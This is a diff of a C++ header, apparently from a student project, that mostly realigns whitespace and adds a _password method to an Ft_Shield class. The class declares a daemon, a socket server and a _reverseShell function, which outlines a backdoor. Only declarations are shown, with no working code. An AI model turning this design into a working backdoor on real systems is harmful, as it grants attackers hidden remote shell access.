@@ -24,15 +24,15 @@ class Ft_Shield
 {
 	public:
 	/*---------- Constructors ----------------------*/
-					Ft_Shield(void);
-					Ft_Shield(const Ft_Shield & shield);
+						Ft_Shield(void);
+						Ft_Shield(const Ft_Shield & shield);
 	/*---------- Destructor ------------------------*/
-					~Ft_Shield(void);
+						~Ft_Shield(void);
 
-		Ft_Shield &	operator=(const Ft_Shield & shield);
+		Ft_Shield &		operator=(const Ft_Shield & shield);
 
 	/*---------- Public function members -----------*/
-		void		daemonize(void);
+		void			daemonize(void);
 
 	private:
 	/*---------- Private typedef -------------------*/
@@ -56,14 +56,15 @@ class Ft_Shield
 		t_commands		_cmdMap;
 
 	/*---------- Private function members ----------*/
-		void		_checkInstance(void);
-		int			_mkSrv(void);
-		void		_runSrv(void);
-		void		_exit(void);
-		void		_shutdown(int fd);
-		void		_reverseShell(int fd);
-		void		_disconnect(int fd);
-		void		_help(int fd);
+		void			_checkInstance(void);
+		int				_mkSrv(void);
+		void			_runSrv(void);
+		void			_exit(void);
+		void			_shutdown(int fd);
+		void			_reverseShell(int fd);
+		void			_disconnect(int fd);
+		void			_help(int fd);
+		int				_password(int fd);
 };
 
 #endif /* FT_SHIELD_HPP */
